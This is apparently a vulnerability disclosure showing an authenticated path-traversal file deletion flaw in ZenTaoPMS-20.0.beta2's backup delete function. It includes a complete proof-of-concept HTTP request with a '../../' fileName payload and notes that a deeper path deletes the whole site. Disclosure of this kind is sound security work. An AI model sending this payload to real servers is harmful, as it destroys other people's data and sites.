# Any file deletion vulnerability exists in ZenTaoPMS-20.0.beta2

There is a vulnerability in the delete method in ZenTaoPMS-20.0.beta2-php7.2_7.4\zentaopms\module\backup\control.php.

![image](https://github.com/sec-Kode/cve2/assets/46676387/27165e11-c723-4d00-8b87-7209c92af813)
There is an unlink dangerous function here, and there is no filtering, so any file deletion operation can be performed.

And it will be deleted here in the form of the entire folder.

For the convenience of demonstration, create a folder named kode in the F:\phpstudy_pro\WWW\127.0.0.1\ZenTaoPMS-20.0.beta2-php7.2_7.4\zentaopms directory

![image](https://github.com/sec-Kode/cve2/assets/46676387/b1f83c55-94f2-4f1b-95d3-186d0e260144)

This vulnerability requires logging into the website backend to operate.

After logging in to the backend, we can use the following payload to delete the entire kode folder.

```
GET /www/index.php?m=backup&f=delete&fileName=../../kode HTTP/1.1
Host: 127.0.0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.2/www/index.php?m=index&f=app&t=html
X-ZIN-Options: {"selector":["body>*","title>*","#configJS"],"type":"list"}
X-ZIN-App: admin
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: lang=zh-cn; device=desktop; theme=default; hideMenu=false; zentaosid=f4b230b8e5e69f9f22d9eb70df23e7db4edeeab5; vision=rnd; tab=admin; zentaosid=7bit6mr0sjtg18t0037sc62c5g; lang=zh-cn; device=desktop; theme=default; windowWidth=1094; windowHeight=908; vision=rnd; XDEBUG_SESSION=PHPSTORM
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

```

The kode folder was deleted successfully

![image](https://github.com/sec-Kode/cve2/assets/46676387/e5bec4b3-9e98-46e3-8013-03d06a3956af)

![image](https://github.com/sec-Kode/cve2/assets/46676387/361df370-29fc-49cd-bc72-7b5537e88d90)

If the deletion path of the payload is ../../../, all files and directories under the entire zentaopms folder will be deleted, causing all directories of the website to be deleted.

